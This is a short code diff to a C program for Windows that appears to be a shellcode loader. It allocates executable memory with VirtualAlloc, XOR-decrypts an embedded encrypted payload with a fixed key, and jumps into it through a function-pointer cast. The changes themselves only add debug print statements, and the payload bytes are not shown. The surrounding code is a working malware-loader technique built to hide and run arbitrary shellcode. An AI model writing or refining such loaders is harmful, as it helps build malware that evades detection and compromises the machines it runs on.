@@ -39,11 +39,15 @@ size_t payload_size = sizeof(encrypted_payload);
 char key = 0xAA;  // XOR key
 
 int main() {
+    printf("%s\n", "got to main");
+
     char *decrypted_payload = (char *)VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (decrypted_payload == NULL) {
         printf("Memory allocation failed.\n");
         return 1;
     }
+
+    printf("%s\n", "the memory is allocated");
 
 
     memcpy(decrypted_payload, encrypted_payload, payload_size);
@@ -51,7 +55,7 @@ int main() {
 
     xor_decrypt(decrypted_payload, payload_size, key);
 
-
+    
     ((void(*)())decrypted_payload)();
 
 
